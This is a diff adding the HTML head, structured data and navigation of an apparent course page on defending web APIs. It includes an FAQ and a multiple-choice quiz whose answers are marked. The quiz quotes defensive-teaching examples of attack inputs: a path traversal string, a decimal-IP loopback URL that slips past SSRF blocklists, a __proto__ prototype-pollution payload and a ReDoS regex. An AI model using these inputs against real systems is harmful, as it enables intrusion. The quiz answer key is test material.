@@ -1,0 +1,1803 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!-- Primary SEO -->
+    <title>Web &amp; API Security: XSS, CSRF, SSRF, CORS | Backend Master</title>
+    <meta name="description" content="Defend your API against XSS, CSRF, SSRF, CORS mistakes, path traversal, command injection, prototype pollution and ReDoS, with attacks and fixes you can run.">
+    <meta name="author" content="Shivam Thakur">
+    <meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+    <link rel="canonical" href="https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp">
+    <link rel="alternate" hreflang="en" href="https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp">
+    <link rel="alternate" hreflang="x-default" href="https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp">
+    <meta name="theme-color" content="#EBEBEB" media="(prefers-color-scheme: light)">
+    <meta name="theme-color" content="#0F0F0F" media="(prefers-color-scheme: dark)">
+    <meta name="keywords" content="web application security, xss prevention, csrf protection, ssrf prevention, cors misconfiguration, prototype pollution, redos, helmet security headers, owasp top 10, Shivam Thakur">
+    <link rel="prev" href="https://shivamthakur.me/learn/backend-master/authorization-rbac-idor-row-level-security">
+    <link rel="next" href="https://shivamthakur.me/learn/backend-master/backend-testing-strategy-node-test-integration-property">
+    <meta property="article:published_time" content="2026-11-16T00:00:00+05:30">
+    <meta property="article:modified_time" content="2026-11-16T00:00:00+05:30">
+    <meta property="article:author" content="https://shivamthakur.me/#about">
+    <meta property="article:section" content="Backend Development">
+    <meta property="article:tag" content="web application security">
+    <meta property="article:tag" content="xss prevention">
+    <meta property="article:tag" content="csrf protection">
+    <meta property="article:tag" content="ssrf prevention">
+    <meta property="article:tag" content="cors misconfiguration">
+    <meta property="article:tag" content="prototype pollution">
+    <meta property="article:tag" content="redos">
+    <meta property="article:tag" content="helmet security headers">
+    <meta property="article:tag" content="owasp top 10">
+
+    <!-- Geo -->
+    <meta name="geo.region" content="IN-UP">
+    <meta name="geo.placename" content="Agra, Uttar Pradesh, India">
+    <meta name="geo.position" content="27.1767;78.0081">
+    <meta name="ICBM" content="27.1767, 78.0081">
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="Shivam Thakur — Full Stack Developer">
+    <meta property="og:locale" content="en_IN">
+    <meta property="og:title" content="Web &amp; API Security: XSS, CSRF, SSRF, CORS">
+    <meta property="og:description" content="Defend your API against XSS, CSRF, SSRF, CORS mistakes, path traversal, command injection, prototype pollution and ReDoS, with attacks and fixes you can run.">
+    <meta property="og:url" content="https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp">
+    <meta property="og:image" content="https://shivamthakur.me/assets/images/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Web and API Security: XSS, CSRF, SSRF, CORS, Injection and Hardening: Backend Master chapter 23">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Web &amp; API Security: XSS, CSRF, SSRF, CORS">
+    <meta name="twitter:description" content="Defend your API against XSS, CSRF, SSRF, CORS mistakes, path traversal, command injection, prototype pollution and ReDoS, with attacks and fixes you can run.">
+    <meta name="twitter:image" content="https://shivamthakur.me/assets/images/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp.png">
+    <meta name="twitter:image:alt" content="Web and API Security: XSS, CSRF, SSRF, CORS, Injection and Hardening: Backend Master chapter 23">
+
+    <!-- font -->
+    <link rel="stylesheet" href="../../assets/fonts/fonts.css">
+    <link rel="stylesheet" href="../../assets/fonts/inter/inter.css">
+    <link rel="stylesheet" href="../../assets/icon/icomoon/style.css">
+    <!-- css -->
+    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../../assets/css/swiper-bundle.min.css">
+    <link rel="stylesheet" href="../../assets/css/animate.css">
+    <link rel="stylesheet" type="text/css" href="../../assets/css/styles.css">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="../../assets/images/logo/favicon.png">
+    <link rel="apple-touch-icon-precomposed" href="../../assets/images/logo/favicon.png">
+    <link rel="stylesheet" href="../../assets/css/hljs-github-dark.min.css">
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "WebPage",
+          "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#webpage",
+          "url": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp",
+          "name": "Web & API Security: XSS, CSRF, SSRF, CORS | Backend Master",
+          "description": "Defend your API against XSS, CSRF, SSRF, CORS mistakes, path traversal, command injection, prototype pollution and ReDoS, with attacks and fixes you can run.",
+          "inLanguage": "en",
+          "dateModified": "2026-11-16",
+          "isPartOf": {
+            "@id": "https://shivamthakur.me/#website"
+          },
+          "primaryImageOfPage": {
+            "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#image"
+          },
+          "breadcrumb": {
+            "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#breadcrumb"
+          },
+          "mainEntity": {
+            "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#article"
+          },
+          "speakable": {
+            "@type": "SpeakableSpecification",
+            "cssSelector": [
+              ".learn-summary",
+              ".learn-faq"
+            ]
+          }
+        },
+        {
+          "@type": "ImageObject",
+          "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#image",
+          "url": "https://shivamthakur.me/assets/images/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp.png",
+          "width": 1200,
+          "height": 630,
+          "caption": "Web and API Security: XSS, CSRF, SSRF, CORS, Injection and Hardening"
+        },
+        {
+          "@type": [
+            "TechArticle",
+            "LearningResource"
+          ],
+          "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#article",
+          "mainEntityOfPage": {
+            "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#webpage"
+          },
+          "headline": "Web and API Security: XSS, CSRF, SSRF, CORS, Injection and Hardening",
+          "alternativeHeadline": "Web and API Security — Attacks on the Browser, the Network, and Your Own Code",
+          "description": "Defend your API against XSS, CSRF, SSRF, CORS mistakes, path traversal, command injection, prototype pollution and ReDoS, with attacks and fixes you can run.",
+          "abstract": "Most web vulnerabilities come from treating data as code. This chapter runs vulnerable and fixed routes side by side for XSS, path traversal, command injection, SSRF, open redirects, CORS, CSRF, prototype pollution and ReDoS, adds security headers with helmet, and covers limits, secrets and dependency risk against the OWASP Top 10.",
+          "image": "https://shivamthakur.me/assets/images/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp.png",
+          "url": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp",
+          "author": {
+            "@type": "Person",
+            "@id": "https://shivamthakur.me/#person",
+            "name": "Shivam Thakur",
+            "url": "https://shivamthakur.me/"
+          },
+          "publisher": {
+            "@type": "Person",
+            "@id": "https://shivamthakur.me/#person",
+            "name": "Shivam Thakur",
+            "url": "https://shivamthakur.me/"
+          },
+          "inLanguage": "en",
+          "datePublished": "2026-11-16",
+          "dateModified": "2026-11-16",
+          "wordCount": 6530,
+          "timeRequired": "PT30M",
+          "articleSection": "Backend Development",
+          "keywords": "web application security, xss prevention, csrf protection, ssrf prevention, cors misconfiguration, prototype pollution, redos, helmet security headers, owasp top 10",
+          "proficiencyLevel": "Intermediate",
+          "educationalLevel": "Intermediate",
+          "teaches": [
+            "Output encoding and Content-Security-Policy",
+            "Preventing path traversal and command injection",
+            "SSRF defences and open redirects",
+            "CORS and CSRF correctly understood",
+            "Prototype pollution, ReDoS and resource limits"
+          ],
+          "learningResourceType": "Chapter",
+          "educationalUse": "Self Study",
+          "programmingLanguage": [
+            "JavaScript",
+            "SQL"
+          ],
+          "about": {
+            "@type": "Thing",
+            "name": "web application security"
+          },
+          "isAccessibleForFree": true,
+          "position": 23,
+          "isPartOf": {
+            "@id": "https://shivamthakur.me/learn/backend-master#course"
+          },
+          "isBasedOn": {
+            "@type": "TechArticle",
+            "@id": "https://shivamthakur.me/learn/backend-master/authorization-rbac-idor-row-level-security#article",
+            "name": "Authorization and Access Control: RBAC, IDOR, Mass Assignment and Row-Level Security",
+            "url": "https://shivamthakur.me/learn/backend-master/authorization-rbac-idor-row-level-security"
+          }
+        },
+        {
+          "@type": "BreadcrumbList",
+          "itemListElement": [
+            {
+              "@type": "ListItem",
+              "position": 1,
+              "name": "Home",
+              "item": "https://shivamthakur.me/"
+            },
+            {
+              "@type": "ListItem",
+              "position": 2,
+              "name": "Learn",
+              "item": "https://shivamthakur.me/learn"
+            },
+            {
+              "@type": "ListItem",
+              "position": 3,
+              "name": "Backend Master",
+              "item": "https://shivamthakur.me/learn/backend-master"
+            },
+            {
+              "@type": "ListItem",
+              "position": 4,
+              "name": "Web & API Security: XSS, CSRF, SSRF, CORS",
+              "item": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp"
+            }
+          ],
+          "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#breadcrumb"
+        },
+        {
+          "@type": "FAQPage",
+          "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#faq",
+          "mainEntity": [
+            {
+              "@type": "Question",
+              "name": "Does CORS protect my API?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "No. CORS only controls whether a browser lets page JavaScript read a cross-origin response. curl and attackers ignore it, so you still need authentication and authorization."
+              }
+            },
+            {
+              "@type": "Question",
+              "name": "How do I prevent SSRF?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Allow-list destinations, resolve DNS and block private, loopback and link-local addresses, do not follow redirects automatically, set timeouts and restrict egress at the network level."
+              }
+            },
+            {
+              "@type": "Question",
+              "name": "What is the difference between XSS and CSRF?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "XSS runs attacker script on your site. CSRF makes a victim's browser send authenticated requests from the attacker's site using cookies. Fix XSS first, because it defeats CSRF defences."
+              }
+            },
+            {
+              "@type": "Question",
+              "name": "What is ReDoS?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "A regular expression with nested quantifiers can take exponential time on crafted input and, because Node is single-threaded, freeze the whole server. Cap input length and avoid nested quantifiers."
+              }
+            }
+          ]
+        },
+        {
+          "@type": "Quiz",
+          "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#quiz",
+          "name": "Web & API Security: XSS, CSRF, SSRF, CORS: 20 multiple choice questions",
+          "educationalLevel": "Intermediate",
+          "inLanguage": "en",
+          "about": {
+            "@type": "Thing",
+            "name": "web application security"
+          },
+          "isPartOf": {
+            "@id": "https://shivamthakur.me/learn/backend-master/web-api-security-xss-csrf-ssrf-cors-owasp#article"
+          },
+          "hasPart": [
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "The fundamental cause behind injection attacks is:",
+              "text": "The fundamental cause behind injection attacks is:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Untrusted data being interpreted as code/commands"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Weak passwords"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Slow servers"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Missing indexes"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "The primary XSS defence is:",
+              "text": "The primary XSS defence is:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Context-aware output encoding (plus CSP as a backup)"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Input length limits"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "HTTPS"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Rate limiting"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "HttpOnly on a session cookie:",
+              "text": "HttpOnly on a session cookie:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Stops JavaScript from reading the cookie"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Prevents XSS"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Prevents CSRF"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Encrypts it"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "path.join(base, '../secret.txt') returns a path:",
+              "text": "path.join(base, '../secret.txt') returns a path:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Outside base: containment must be checked after resolve"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Inside base"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "That throws"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Always base"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "Why check startsWith(pub + path.sep) rather than startsWith(pub)?",
+              "text": "Why check startsWith(pub + path.sep) rather than startsWith(pub)?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "A sibling like public-evil would pass the shorter check"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Style"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Windows only"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Speed"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "The safe way to run an external program with user data:",
+              "text": "The safe way to run an external program with user data:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "execFile('cmd', [x]) plus validation"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "exec(\\cmd ${x}\\)"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "eval"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "sh -c"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "SSRF is dangerous mainly because the server:",
+              "text": "SSRF is dangerous mainly because the server:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Can reach internal services and cloud metadata that outsiders can't"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Is slow"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Uses HTTP"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Has no CORS"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "http://2130706433/ demonstrates that:",
+              "text": "http://2130706433/ demonstrates that:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "String blocklists miss alternate spellings of 127.0.0.1"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Decimal IPs are invalid"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "DNS is slow"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Redirects are safe"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "A robust SSRF defence combines:",
+              "text": "A robust SSRF defence combines:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Allow-list + resolve-and-check IP + no auto-redirect + timeouts (+ egress filtering)"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Only a regex"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Blocking \"localhost\""
+                },
+                {
+                  "@type": "Answer",
+                  "text": "CORS"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "The remaining SSRF risk after resolve-and-check is:",
+              "text": "The remaining SSRF risk after resolve-and-check is:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "DNS rebinding (time-of-check/time-of-use)"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "None"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "HTTPS"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Cookies"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "The CORS config { origin: true, credentials: true } is dangerous because it:",
+              "text": "The CORS config { origin: true, credentials: true } is dangerous because it:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Reflects any origin and allows credentials, letting any site read authenticated responses"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Is slow"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Blocks all origins"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Disables cookies"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "CORS protects against:",
+              "text": "CORS protects against:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Cross-origin reads by browser JavaScript only; not requests from non-browser clients"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "curl requests"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "SQL injection"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "DDoS"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "CSRF requires that the target endpoint authenticates via:",
+              "text": "CSRF requires that the target endpoint authenticates via:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Ambient credentials such as cookies"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Bearer headers set by your JS"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "mTLS only"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "API keys in the body"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "In the test, a forged request with a spoofed good Origin but no CSRF token:",
+              "text": "In the test, a forged request with a spoofed good Origin but no CSRF token:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Was rejected with 403"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Succeeded"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Returned 500"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Redirected"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "Which header tells browsers to use HTTPS only for a domain?",
+              "text": "Which header tells browsers to use HTTPS only for a domain?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "HSTS (Strict-Transport-Security)"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "CSP"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "CORS"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Referrer-Policy"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "Prototype pollution via JSON.parse('{\"__proto__\":{\"isAdmin\":true}}') plus a naive merge makes:",
+              "text": "Prototype pollution via JSON.parse('{\"__proto__\":{\"isAdmin\":true}}') plus a naive merge makes:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Every plain object appear to have isAdmin"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Only the merged object admin"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Nothing"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "The process exit"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "Which is a fix for prototype pollution?",
+              "text": "Which is a fix for prototype pollution?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Skip __proto__/constructor/prototype keys, use strict schemas, Object.create(null)"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "Use bigger objects"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "JSON.stringify twice"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Minify"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "/^(a+)+$/ is dangerous because:",
+              "text": "/^(a+)+$/ is dangerous because:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Nested quantifiers cause exponential backtracking on non-matching input, blocking the event loop"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "It's slow only for long strings"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "It matches too much"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "It's invalid"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "In our test, an innocent request during a ReDoS took about:",
+              "text": "In our test, an innocent request during a ReDoS took about:",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "2.5 s (blocked behind the regex)"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "3 ms"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Failed"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "100 ms"
+                }
+              ]
+            },
+            {
+              "@type": "Question",
+              "eduQuestionType": "Multiple choice",
+              "name": "Which practice best addresses the supply-chain risk?",
+              "text": "Which practice best addresses the supply-chain risk?",
+              "acceptedAnswer": {
+                "@type": "Answer",
+                "text": "Commit the lockfile, use npm ci, run audits, review updates"
+              },
+              "suggestedAnswer": [
+                {
+                  "@type": "Answer",
+                  "text": "npm install latest on deploy"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Delete node_modules"
+                },
+                {
+                  "@type": "Answer",
+                  "text": "Disable HTTPS"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+    </script>
+</head>
+
+<body class="counter-scroll inner-page learn-reader-page">
+    <a href="#main-content" class="skip-link">Skip to content</a>
+
+    <!-- Preload -->
+    <div class="preload preload-container" id="preload">
+        <div class="preload-logo">
+            <div class="spinner"></div>
+        </div>
+    </div>
+    <!-- /Preload -->
+
+    <!-- Body Background -->
+    <div class="body-background">
+        <div class="bg-item">
+            <img loading="lazy" width="1440" height="900" src="../../assets/images/item/cloud-bg.png" alt="Ambient cloud background">
+        </div>
+    </div>
+    <!-- /Body Background -->
+
+    <!-- Menu Mobile -->
+    <div class="action-open-mobile d-lg-none">
+        <div class="tf-btn-icon style-2">
+            <div class="btn-mobile-menu">
+                <span></span>
+            </div>
+        </div>
+        <div class="nav-mobile-list">
+            <ul class="nav-mobile-item">
+                <li class="nav-item">
+                    <a href="/#home" class="item-link"><i class="icon icon-home"></i>
+                        <p class="tool-tip text-caption">Home</p>
+                    </a>
+                </li>
+                <li class="br-line"></li>
+                <li class="nav-item">
+                    <a href="/#about" class="item-link"><i class="icon icon-user-circle"></i>
+                        <p class="tool-tip text-caption">About</p>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="../../case-studies" class="item-link"><i class="icon icon-tech-stack"></i>
+                        <p class="tool-tip text-caption">Case Studies</p>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="../../services" class="item-link"><i class="icon icon-service"></i>
+                        <p class="tool-tip text-caption">Services</p>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="../../blog" class="item-link"><i class="icon icon-quote"></i>
+                        <p class="tool-tip text-caption">Blog</p>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="../../learn" class="item-link active"><i class="icon icon-edu"></i>
+                        <p class="tool-tip text-caption">Learn</p>
+                    </a>
+                </li>
+                <li class="br-line"></li>
+                <li class="nav-item">
+                    <a href="/contact" class="item-link"><i class="icon icon-send"></i>
+                        <p class="tool-tip text-caption">Contact</p>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <!-- /Menu Mobile -->
+
+    <!-- Tool Sidebar -->
+    <div class="sidebar-tools pst-v1">
+        <ul class="nav-list">
+            <li class="nav-item">
+                <a href="/#home" class="item-link"><i class="icon icon-home"></i>
+                    <p class="tool-tip text-caption">Home</p>
+                </a>
+            </li>
+            <li class="br-line"></li>
+            <li class="nav-item">
+                <a href="/#about" class="item-link"><i class="icon icon-user-circle"></i>
+                    <p class="tool-tip text-caption">About</p>
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="../../case-studies" class="item-link"><i class="icon icon-tech-stack"></i>
+                    <p class="tool-tip text-caption">Case Studies</p>
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="../../services" class="item-link"><i class="icon icon-service"></i>
+                    <p class="tool-tip text-caption">Services</p>
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="../../blog" class="item-link"><i class="icon icon-quote"></i>
+                    <p class="tool-tip text-caption">Blog</p>
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="../../learn" class="item-link active"><i class="icon icon-edu"></i>
+                    <p class="tool-tip text-caption">Learn</p>
+                </a>
+            </li>
+            <li class="br-line"></li>
+            <li class="nav-item">
+                <a href="/contact" class="item-link"><i class="icon icon-send"></i>
+                    <p class="tool-tip text-caption">Contact</p>
+                </a>
+            </li>
+        </ul>
+    </div>
+    <!-- /Tool Sidebar -->
+
+    <div class="overlay-pop"></div>
+    <main id="wrapper">
+
+        <!-- Time Local -->
+        <div class="tf-header-wrap">
+            <a href="/" class="logo-site">
+                <img class="image-switch" data-light="../../assets/images/logo/logo-s-w.svg" data-dark="../../assets/images/logo/logo-s-w.svg" loading="lazy" width="40"
+                    height="40" src="../../assets/images/logo/logo-s-w.svg" alt="Shivam Thakur logo"><span class="logo-site-name" aria-hidden="true">Shivam Thakur</span>
+            </a>
+            <div class="header-theme"><div class="tf-btn-icon toggle-switch-mode" role="button" tabindex="0" aria-label="Toggle dark mode"><i class="icon icon-light"></i></div></div>
+            
+        </div>
+        <!-- /Time Local -->
+
+
+        <div class="main-content" id="main-content">
+            <nav class="learn-crumbbar" aria-label="Breadcrumb">
+                <ol>
+                    <li><a href="/">Home</a></li>
+                    <li><a href="/learn">Learn</a></li>
+                    <li><a href="/learn/backend-master">Backend Master</a></li>
+                    <li><span aria-current="page">Web &amp; API Security: XSS, CSRF, SSRF, CORS</span></li>
+                </ol>
+            </nav>
+            <div class="learn-shell">
+                <button type="button" class="learn-toggle" id="learnToggle" aria-expanded="false" aria-controls="learnSide">
+                    <i class="icon icon-edu"></i> Chapters
+                </button>
+
+                <aside class="learn-side" id="learnSide" aria-label="Backend Master chapters">
+                    <div class="learn-side-head">
+                        <p class="learn-side-title"><a href="/learn/backend-master">Backend Master</a></p>
+                        <p class="learn-side-sub text-caption">36 chapters &middot; free course</p>
+                        <div class="learn-progress" aria-hidden="true"><span style="width:63.9%"></span></div>
+                        <input type="search" id="learnFilter" class="learn-filter" placeholder="Filter chapters" aria-label="Filter chapters" autocomplete="off">
+                    </div>
+                    <nav class="learn-nav" id="learnNav" aria-label="Chapters">
+<div class="learn-item" data-text="1 what is backend development? start here"><a class="learn-link" href="/learn/backend-master/what-is-backend-development"><span class="num">01</span><span class="name">What Is Backend Development? Start Here</span></a></div>
+<div class="learn-item" data-text="2 how the internet works: dns, tcp &amp; tls"><a class="learn-link" href="/learn/backend-master/how-the-internet-works-dns-tcp-tls"><span class="num">02</span><span class="name">How the Internet Works: DNS, TCP &amp; TLS</span></a></div>
+<div class="learn-item" data-text="3 http explained: methods, status &amp; headers"><a class="learn-link" href="/learn/backend-master/http-explained-methods-status-codes-headers"><span class="num">03</span><span class="name">HTTP Explained: Methods, Status &amp; Headers</span></a></div>
+<div class="learn-item" data-text="4 linux, terminal &amp; git for backend devs"><a class="learn-link" href="/learn/backend-master/linux-terminal-git-for-backend-developers"><span class="num">04</span><span class="name">Linux, Terminal &amp; Git for Backend Devs</span></a></div>
+<div class="learn-item" data-text="5 node.js event loop, streams &amp; threads"><a class="learn-link" href="/learn/backend-master/nodejs-event-loop-streams-worker-threads"><span class="num">05</span><span class="name">Node.js Event Loop, Streams &amp; Threads</span></a></div>
+<div class="learn-item" data-text="6 build a node.js server: routing &amp; middleware"><a class="learn-link" href="/learn/backend-master/nodejs-http-server-routing-middleware-express"><span class="num">06</span><span class="name">Build a Node.js Server: Routing &amp; Middleware</span></a></div>
+<div class="learn-item" data-text="7 express 5 &amp; fastify: validation &amp; security"><a class="learn-link" href="/learn/backend-master/express-5-fastify-validation-zod-security-middleware"><span class="num">07</span><span class="name">Express 5 &amp; Fastify: Validation &amp; Security</span></a></div>
+<div class="learn-item" data-text="8 rest api design: pagination &amp; idempotency"><a class="learn-link" href="/learn/backend-master/rest-api-design-pagination-idempotency-versioning"><span class="num">08</span><span class="name">REST API Design: Pagination &amp; Idempotency</span></a></div>
+<div class="learn-item" data-text="9 graphql with node.js: dataloader &amp; limits"><a class="learn-link" href="/learn/backend-master/graphql-api-nodejs-dataloader-security"><span class="num">09</span><span class="name">GraphQL with Node.js: DataLoader &amp; Limits</span></a></div>
